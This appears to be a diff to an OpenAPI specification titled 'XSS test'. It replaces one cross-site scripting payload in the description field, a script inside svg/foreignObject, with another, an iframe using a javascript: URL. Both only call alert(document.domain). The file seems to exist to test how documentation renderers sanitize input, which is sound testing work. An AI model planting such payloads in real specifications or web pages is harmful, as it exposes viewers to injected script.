@@ -3,7 +3,7 @@ info:
   title: "XSS test"
   version: "1.0.0"
   description: |
-    <svg><foreignObject><script>alert(document.domain)</script></foreignObject></svg>
+    <iframe src=javascript:alert(document.domain)>
 paths:
   /x:
     get:
